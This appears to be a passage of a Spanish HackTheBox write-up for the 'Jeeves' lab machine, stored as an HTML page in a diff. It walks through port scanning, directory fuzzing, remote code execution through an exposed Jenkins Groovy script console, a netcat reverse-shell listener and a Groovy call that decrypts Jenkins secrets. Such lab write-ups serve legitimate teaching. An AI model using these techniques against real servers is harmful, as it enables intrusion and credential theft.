@@ -1,0 +1,1674 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>HackTheBox - Jeeves</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>HackTheBox - Jeeves | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="HackTheBox - Jeeves" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Máquina Windows nivel medio. La elegancia de Jenkins que nos permite jugar con scripts de Groovy para obtener RCE :O Archivos .kdbx con contraseñas dentro (¿qué puede pasar?) y descubriremos objetos ocultos mediante los Alternate Data Stream (ADS)." />
+<meta property="og:description" content="Máquina Windows nivel medio. La elegancia de Jenkins que nos permite jugar con scripts de Groovy para obtener RCE :O Archivos .kdbx con contraseñas dentro (¿qué puede pasar?) y descubriremos objetos ocultos mediante los Alternate Data Stream (ADS)." />
+<link rel="canonical" href="http://localhost:4000/htb/jeeves" />
+<meta property="og:url" content="http://localhost:4000/htb/jeeves" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-25T00:00:00-07:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png" />
+<meta property="twitter:title" content="HackTheBox - Jeeves" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-08-25T00:00:00-07:00","datePublished":"2021-08-25T00:00:00-07:00","description":"Máquina Windows nivel medio. La elegancia de Jenkins que nos permite jugar con scripts de Groovy para obtener RCE :O Archivos .kdbx con contraseñas dentro (¿qué puede pasar?) y descubriremos objetos ocultos mediante los Alternate Data Stream (ADS).","headline":"HackTheBox - Jeeves","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/htb/jeeves"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/htb/jeeves"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">HackTheBox - Jeeves</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-08-25">25 Aug 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114banner.png" alt="HackTheBox - Jeeves">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Máquina Windows nivel medio. La elegancia de <strong>Jenkins</strong> que nos permite jugar con scripts de <strong>Groovy</strong> para obtener <strong>RCE</strong> :O Archivos <strong>.kdbx</strong> con contraseñas dentro (¿qué puede pasar?) y descubriremos objetos ocultos mediante los <strong>Alternate Data Stream</strong> (<strong>ADS</strong>).</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114jeevesHTB.png" alt="114jeevesHTB" /></p>
+
+<h2 id="tldr-spanish-writeup">TL;DR (Spanish writeup)</h2>
+
+<p><strong>Creada por</strong>: <a href="https://www.hackthebox.eu/profile/2984">mrb3n</a>.</p>
+
+<p>Vamos a estar muy elegantes.</p>
+
+<p>Empezaremos con un servidor web algo preguntón, nos moveremos a otro más calmadito con el que fuzzearemos directorios para encontrar recursos fuera de nuestra vista. Llegaremos a un servidor <code>Jenkins</code> bastaaaaante interesante. Usaremos su consola de scripts para ejecutar código -interesante- del lenguaje de programación <code>Groovy</code>. Finalmente obtendremos una <strong>Reverse Shell</strong> como el usuario <code>kohsuke</code>.</p>
+
+<p>Estando en el sistema encontraremos un archivo <code>.kdbx</code> (<strong>KeePass Database</strong>) que contiene tooooooodas las contraseñas guardadas por <strong>kohsuke</strong>, pero para poder verlas necesitamos una contraseña -maestra-, jugaremos con <code>keepass2john</code> y <code>john</code> para crackear la credencial maestra, esto para obtener acceso completo a la base de datos con la herramienta <code>kpcli</code>.</p>
+
+<p>Una de las contraseñas contiene un backup de unos hashes al dumpear la <code>SAM</code>, con ayuda de <code>psexec</code> lograremos probarlos contra el usuario <code>Administrator</code> y obtener una <strong>terminal</strong> en el sistema como el usuario <code>nt authority\system</code>.</p>
+
+<p>Y tendremos que hacer un pequeño movimiento con los <code>Alternate Data Stream</code> para encontrar la flag <code>root.txt</code> oculta en un archivo.</p>
+
+<p>…</p>
+
+<h3 id="clasificación-de-la-máquina-según-la-gentesita">Clasificación de la máquina según la gentesita</h3>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114statistics.png" style="display: block; margin-left: auto; margin-right: auto; width: 80%;" /></p>
+
+<p>Algunas vulns conocidas y cositas reales.</p>
+
+<blockquote>
+  <p>Escribo para tener mis “notas”, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) además de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva más de enseñanza que de solo mostrar lo que hice.</p>
+</blockquote>
+
+<p>…</p>
+
+<p>En las noches frías.</p>
+
+<ol>
+  <li><a href="#reconocimiento">Reconocimiento</a>.
+    <ul>
+      <li><a href="#enum-nmap">Enumeración de puertos con nmap</a>.</li>
+    </ul>
+  </li>
+  <li><a href="#enumeracion">Enumeración</a>.
+    <ul>
+      <li><a href="#puerto-80">Recorremos el puerto 80</a>.</li>
+      <li><a href="#puerto-50000">Recorremos el puerto 50000</a>.</li>
+      <li><a href="#web-jenkins-found">Encontramos servidor <strong>Jenkins</strong> en el puerto <strong>50000</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#explotacion">Explotación</a>.
+    <ul>
+      <li><a href="#jenkins-groovy-scripts">Usamos instrucciones del lenguaje <strong>Groovy</strong> para ejecutar comandos en el sistema</a>.</li>
+      <li><a href="#decrypt-jenkins-secrets">Intentamos desencriptar los secretos de <strong>Jenkins</strong></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#escalada-de-privilegios">Escalada de privilegios</a>.
+    <ul>
+      <li><a href="#keepass2john">Jugamos con el archivo <strong>KeePass</strong> y obtenemos <strong>master password</strong> de la base de datos</a>.</li>
+      <li><a href="#keepass-cracked">Vemos credenciales del gestor <strong>KeePass</strong></a>.</li>
+      <li><a href="#psexec">Usamos <strong>psexec</strong> para obtener una <strong>terminal</strong> usando **hashes almacenados en la <u>.kdbx</u></a>.</li>
+    </ul>
+  </li>
+  <li><a href="#ads">Vemos que la flag esta oculta con un <strong>Alternate Data Stream</strong></a>.</li>
+</ol>
+
+<p>…</p>
+
+<h1 id="reconocimiento">Reconocimiento <a href="#reconocimiento">#</a></h1>
+
+<p>…</p>
+
+<h2 id="enum-nmap">Enumeración de puertos con nmap <a href="#enum-nmap">📌</a></h2>
+
+<p>Empezaremos viendo que puertos tiene abiertos la máquina, así vamos direccionando nuestro research, usaremos <code>nmap</code>:</p>
+
+<pre><code class="language-bash">❱ nmap -p- --open -v 10.10.10.63 -oG initScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p-</td>
+      <td style="text-align: left">Escanea todos los 65535</td>
+    </tr>
+    <tr>
+      <td>–open</td>
+      <td style="text-align: left">Solo los puertos que están abiertos</td>
+    </tr>
+    <tr>
+      <td>-v</td>
+      <td style="text-align: left">Permite ver en consola lo que va encontrando</td>
+    </tr>
+    <tr>
+      <td>-oG</td>
+      <td style="text-align: left">Guarda el output en un archivo con formato grepeable para usar una <a href="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png">función <strong>extractPorts</strong></a> de <a href="https://s4vitar.github.io/">S4vitar</a> que me extrae los puertos en la clipboard</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>El escaneo nos devuelve:</p>
+
+<pre><code class="language-bash">❱ cat initScan
+# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.63
+# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
+Host: 10.10.10.63 ()	Status: Up
+Host: 10.10.10.63 ()	Ports: 80/open/tcp//http///, 135/open/tcp//msrpc///, 445/open/tcp//microsoft-ds///, 50000/open/tcp//ibm-db2///	Ignored State: filtered (65531)
+# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 204.57 seconds
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Puerto</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>80</td>
+      <td style="text-align: left"><strong><a href="https://searchnetworking.techtarget.com/definition/port-80">HTTP</a></strong>: Nos ofrece un servidor web.</td>
+    </tr>
+    <tr>
+      <td>135/445</td>
+      <td style="text-align: left"><strong><a href="https://ayudaleyprotecciondatos.es/2021/03/04/protocolo-smb/">SMB</a></strong>: Protocolo para compartir información entre dispositivos de una red.</td>
+    </tr>
+    <tr>
+      <td>50000</td>
+      <td style="text-align: left">ibm-db2: No sabemos aún que esta sirviendo el puerto en concreto.</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Bien, ahora que sabemos que puertos hay, vamos a profundizar un poco más y descubrir que scripts y versiones están siendo mantenid@s por cada servicio:</p>
+
+<p><strong>~(Usando la función <code>extractPorts</code> (referenciada antes) podemos copiar rápidamente los puertos en la clipboard, así no tenemos que ir uno a uno</strong></p>
+
+<pre><code class="language-bash">❱ extractPorts initScan 
+[*] Extracting information...
+
+    [*] IP Address: 10.10.10.63
+    [*] Open ports: 80,135,445,50000
+
+[*] Ports copied to clipboard
+</code></pre>
+
+<p><strong>)~</strong></p>
+
+<pre><code class="language-bash">❱ nmap -p 80,135,445,50000 -sC -sV 10.10.10.63 -oN portScan
+</code></pre>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parámetro</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>-p</td>
+      <td style="text-align: left">Escaneo de los puertos obtenidos</td>
+    </tr>
+    <tr>
+      <td>-sC</td>
+      <td style="text-align: left">Muestra todos los scripts relacionados con el servicio</td>
+    </tr>
+    <tr>
+      <td>-sV</td>
+      <td style="text-align: left">Nos permite ver la versión del servicio</td>
+    </tr>
+    <tr>
+      <td>-oN</td>
+      <td style="text-align: left">Guarda el output en un archivo</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Y este escaneo nos muestra:</p>
+
+<pre><code class="language-bash">❱ cat portScan
+# Nmap 7.80 scan initiated Tue Aug 17 25:25:25 2021 as: nmap -p 80,135,445,50000 -sC -sV -oN portScan 10.10.10.63
+Nmap scan report for 10.10.10.63
+Host is up (0.11s latency).
+
+PORT      STATE SERVICE      VERSION
+80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Ask Jeeves
+135/tcp   open  msrpc        Microsoft Windows RPC
+445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
+|_http-server-header: Jetty(9.4.z-SNAPSHOT)
+|_http-title: Error 404 Not Found
+Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 5h05m37s, deviation: 0s, median: 5h05m36s
+|_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
+| smb-security-mode: 
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-08-17T21:40:02
+|_  start_date: 2021-08-17T21:30:10
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Tue Aug 17 25:25:25 2021 -- 1 IP address (1 host up) scanned in 48.15 seconds
+</code></pre>
+
+<p>Cositas relevantes:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: left">Puerto</th>
+      <th style="text-align: left">Servicio</th>
+      <th style="text-align: left">Versión</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: left">80</td>
+      <td style="text-align: left">HTTP</td>
+      <td style="text-align: left"> </td>
+    </tr>
+  </tbody>
+</table>
+
+<ul>
+  <li>Vemos <code>Ask Jeeves</code>, es curioso, pero no tenemos aún certeza de que es.</li>
+</ul>
+
+<hr />
+
+<table>
+  <tbody>
+    <tr>
+      <td>Puerto</td>
+      <td>Servicio</td>
+      <td>Versión</td>
+    </tr>
+    <tr>
+      <td>50000</td>
+      <td>HTTP</td>
+      <td>Jetty 9.4.z-SNAPSHOT</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Esa versión suena locochona, tengámosla en cuenta para más adelante, por ahora no vemos nada más, sigamos.</p>
+
+<p>…</p>
+
+<h1 id="enumeracion">Enumeración <a href="#enumeracion">#</a></h1>
+
+<p>…</p>
+
+<h2 id="puerto-80">Puerto 80 <a href="#puerto-80">📌</a></h2>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Lindo, encontramos el logo del famoso <a href="https://es.wikipedia.org/wiki/Ask.com">Ask</a> (que su nombre original es <code>Ask Jeeves</code>), encargado de hacer búsquedas en internet (es como un <strong>Google</strong>), así que contamos con un motor de búsqueda como primera medida.</p>
+
+<p>Existe un campo en el que podemos escribir cositas para ser buscadas, pero con cualquier término nos redirige al recurso <code>error.html</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_SourceHTML_link2errorHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Y ese recurso tiene esta imagen:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_SourceHTML.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page80_errorHTML_jeevesPNG.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>De ella podemos destacar varias cositas:</p>
+
+<ul>
+  <li><code>Microsoft SQL Server 2005 - 9.00.4053</code>.</li>
+  <li>Una ruta de los archivos de la web: <code>c:\webroot\Sock_Puppets\...</code>.</li>
+  <li>Y al final unas versiones, tanto de <code>.NET</code> como de <code>ASP.NET</code>.</li>
+</ul>
+
+<p>No sabemos si esto nos sirva de algo (por la fecha que tiene el error) pero podemos guardarlo (:</p>
+
+<hr />
+
+<h2 id="puerto-50000">Puerto 50000 <a href="#puerto-50000">📌</a></h2>
+
+<p>Revisando el servicio del puerto <code>50000</code> encontramos esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Volvemos a ver la referencia hacia <code>Jetty 9.4.z-SNAPSHOT</code>, así que busquemos de que trata…</p>
+
+<p>🚏🚏🚏 <strong><em><code>Jetty</code> es un servidor web y contenedor de <u>Servlets</u> (clases que ayudan a ampliar las capacidades de un servidor) que se enfoca <u>100%</u> en <code>Java</code>.</em></strong></p>
+
+<p>Bien, buscando vulnerabilidades relacionadas con la versión <code>9.4.z-SNAPSHOT</code> o <code>9.4</code> caemos en este post:</p>
+
+<ul>
+  <li><a href="https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638">Critical Jenkins Server Vulnerability - (CVE-2019-17638)</a>.</li>
+</ul>
+
+<p>🚀 <strong><em>“Jenkins, the open-source automation server software, had a critical vulnerability (CVE-2019-17638) in the <code>Jetty</code> web server that allowed the leakage of users confidential data.</em></strong>” <a href="https://www.davosnetworks.com/critical-jenkins-server-vulnerability-cve-2019-17638">davosnetworks</a>.</p>
+
+<p>OJOOOOooklajsdlñf ¿qué es Jenkins? ¿? ¿? rápidamenteeeeeee…</p>
+
+<p>La idea de <strong>Jenkins</strong> es supervisar tooooooodas las tareas repetitivas que se realizan en un proyecto, peeeeeero lo hace él, eso evita a los programadores estar revisando y revisando problemas o temas relacionados con el código. Su definición es sencilla: <strong><em>servidor automatizado de integración continua</em></strong>.</p>
+
+<p>Les dejo este excelente post donde se habla de que es <strong>Jenkins</strong> y <strong>la integración continua</strong>:</p>
+
+<ul>
+  <li><a href="https://ciberninjas.com/jenkins/">¿Qué es Jenkins?, Herramienta de Integración Continua</a>.</li>
+</ul>
+
+<p>Bien, peeeeeeeeeeeeeeero no podemos hacer nada con esa vulnerabilidad que encontramos, ya que tenemos el servidor <strong>Jetty</strong> pero no el servidor <strong>Jenkins</strong>.</p>
+
+<p>…</p>
+
+<h2 id="web-jenkins-found">Encontramos servidor <u>Jenkins</u> en el puerto <u>50000</u> <a href="#web-jenkins-found">📌</a></h2>
+
+<p>Después de estar probando cositas, encontramos algo llamativo al fuzzear directorios que la web sostiene, pero fuera de nuestra vista.</p>
+
+<p>Usaremos <code>wfuzz</code> pasándole 20 hilos, el wordlist que usara y en que parte la <strong>URL</strong> queremos que pruebe cada línea:</p>
+
+<pre><code class="language-bash">❱ wfuzz -c --hc=404 -t 20 -w /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.63:50000/FUZZ
+...
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                        
+=====================================================================
+
+000041607:   302        0 L      0 W        0 Ch        "askjeeves"
+...
+</code></pre>
+
+<p>Súper leeeeeeejos (el archivo tiene más de 200k líneas) encontró un recurso llamado <code>askjeeves</code> (que se relaciona con nuestro servicio en el puerto <strong>80</strong>), es un redirect, pero veámoslo a ver a donde nos lleva:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pos si, tamos en la interfaz del servidor <code>Jenkins</code>, lo primero llamativo a la vista fue la versión que esta abajo a la derecha: <code>Jenkins 2.87</code>, esto nos abre una nueva puerta para buscar vulns.</p>
+
+<p>…</p>
+
+<h1 id="explotacion">Explotación <a href="#explotacion">#</a></h1>
+
+<p>Indagando un poco en las opciones que nos brinda el servidor, vemos en la parte izquierda una tuerca y el texto <code>Manage Jenkins</code>, si damos clic recibimos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList1.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manageList2.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Hay varios apartados interesantes, pero de toooooooooodos hay dos muuuuy llamativos: <code>System Information</code> (info del entorno donde esta montado <strong>Jenkins</strong>) y <code>Script Console</code> (permite ejecutar scripts).</p>
+
+<p>🚆 <strong>System Information</strong>:</p>
+
+<p>Uff bastantes cositas… Pero lo más relevante sería esto:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_systemInfo.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Tenemos dos usuarios del sistema y vemos la ruta donde esta el ejecutable de <code>Jenkins</code> (que esta en una de las carpetas del usuario <strong>Administrator</strong>).</p>
+
+<p>🚆 <strong>Script Console</strong>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Él mismo nos informa que podemos escribir ahí:</p>
+
+<blockquote>
+  <p>Type in an <strong>arbitrary <code>Groovy script</code> and execute it</strong> on the server.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="jenkins-groovy-scripts">Jugamos con scripts de <u>Groovy</u> para ejecutar comandos en el sistema <a href="#jenkins-groovy-scripts">📌</a></h2>
+
+<p>⛰️ <strong><em>Groovy es un lenguaje de programación orientado a objetos implementado sobre la plataforma Java. Groovy usa una sintaxis muy parecida a Java, comparte el mismo modelo de objetos, de hilos y de seguridad.</em></strong> <a href="https://es.wikipedia.org/wiki/Groovy_(lenguaje_de_programaci%C3%B3n)">Wikipedia</a>.</p>
+
+<p>Buscando como usar la consola o ejemplos del lenguaje <code>Groovy</code>, encontramos este recurso:</p>
+
+<ul>
+  <li><a href="https://www.hackingarticles.in/exploiting-jenkins-groovy-script-console-in-multiple-ways/">Exploiting Jenkins Groovy Script Console in Multiple Ways</a>.</li>
+</ul>
+
+<p>El post nos provee directamente un payload para obtener una <strong>Reverse Shell</strong>, lo extrae de este otro recurso:</p>
+
+<ul>
+  <li><a href="https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76">https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Antes de intentarlo quería mostrarles este otro código, con él podemos ejecutar comandos en el sistema y ver su respuesta:</p>
+
+<ul>
+  <li><a href="https://gist.github.com/katta/5465317">https://gist.github.com/katta/5465317</a>.</li>
+</ul>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114google_gist_groovyCommands.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Probémoslo pero con el comando <code>whoami</code> a vel:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_RCE_whoami.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Liiiistooones, el usuario que esta ejecutando el servicio <strong>Jenkins</strong> se llama <code>kohsuke</code> yyyy ya tendríamos ejecución remota de comandos (:</p>
+
+<p>Ese ejemplo me gusto porque es muy sencillo de interpretar. Ahora si intentemos generar la <strong>Reverse Shell</strong>.</p>
+
+<p>Nos ponemos en escucha por el puerto en el que queremos recibirla, en mi caso en el <code>4433</code>:</p>
+
+<pre><code class="language-bash">❱ nc -lvp 4433
+</code></pre>
+
+<p>Y ahora en la consola de scripts ejecutaríamos:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_tryingRevSH.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Le indicamos que nos envíe una petición hacia nuestro puerto <code>4433</code> y que cuando la establezca nos ejecute una <code>cmd.exe</code> (terminal).</p>
+
+<p>Damos clic en <code>Run</code> yyyyyyyyyyy:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_done.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>TAMOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOO!! Conseguimos la reverse <strong>Shell</strong> como el usuario <code>kohsuke</code> y estamos en el sistema (:</p>
+
+<p>…</p>
+
+<p>Con este script logramos una Shell en la misma ejecución del programa:</p>
+
+<blockquote>
+  <p><a href="https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/jeeves/jenkins_pwn_shell.py">jenkins_pwn_shell.py</a></p>
+</blockquote>
+
+<hr />
+
+<h2 id="decrypt-jenkins-secrets">Intentamos desencriptar los secretos de <u>Jenkins</u> <a href="#decrypt-jenkins-secrets">📌</a></h2>
+
+<p>Nuestra primera impresión al ejecutar <code>dir</code> es ver muuuuuuuucho archivos, uno con un nombre llamativo (<code>secret.key</code>) que me hizo volver a un recurso que había desechado:</p>
+
+<ul>
+  <li><a href="https://github.com/gquere/pwn_jenkins#files-to-copy-after-compromission">https://github.com/gquere/pwn_jenkins</a>.</li>
+</ul>
+
+<p>Habla de los 🤫 secretos de <strong>Jenkins</strong> 😶 y lo necesario para desencriptarlos, que serian dos archivos:</p>
+
+<ul>
+  <li><code>secrets/master.key</code>.</li>
+  <li><code>secrets/hudson.util.Secret</code>.</li>
+</ul>
+
+<p>Peeero si bajamos un poquito más <a href="https://github.com/gquere/pwn_jenkins#decrypt-jenkins-secrets-from-groovy">vemos que podemos intentar desencriptarlos</a> con el propio <code>Groovy</code> y sus comandos, pues aprovechemos la consola que tenemos para interactuar con eso…</p>
+
+<p>Simplemente debemos pasarle el secreto:</p>
+
+<pre><code class="language-groovy">println(hudson.util.Secret.decrypt("{...}"))
+</code></pre>
+
+<p>Leyendo <a href="https://gist.github.com/tuxfight3r/eca9442ff76649b057ab">acá</a> entendemos el porqué hay unos <code>{}</code> en el ejemplo de arriba, ellos hacen parte del secreto, por lo que en caso de encontrar algún secreto para lograr desencriptarlo debemos agregar los <code>{}</code> también…</p>
+
+<p>Enumerando las carpetas vemos el archivo <code>config.xml</code> en la ruta <code>..\Administrator\.jenkins\\users\admin</code>; en su contenido hay un <strong>token</strong> entre <code>{}</code>:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114bash_kohsukeRevSH_adminConfigXML_token.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Pues probemos la dezencryptazhion:</p>
+
+<p><img src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/jeeves/114page50000_askjeeves_manage_scriptConsole_ApiToken_decrypt.png" style="display: block; margin-left: auto; margin-right: auto; width: 100%;" /></p>
+
+<p>Nos devuelve un <strong>hash</strong> y ese sería la flag que va en <code>root.txt</code> (: Y iaaaaaaaaa, eso es todo por esta máquina, veamos la flag del <code>user.txt</code>:</p>
+
+<p>E.E noup, ese <strong>hash</strong> debe ser el <code>token</code> del <strong>API</strong> en texto plano, pero ¿nos sirve esto para algo? Por ahora no (no creo que sirva tampoco después), pero aprendimos e.e</p>
+
+<p>…</p>
+
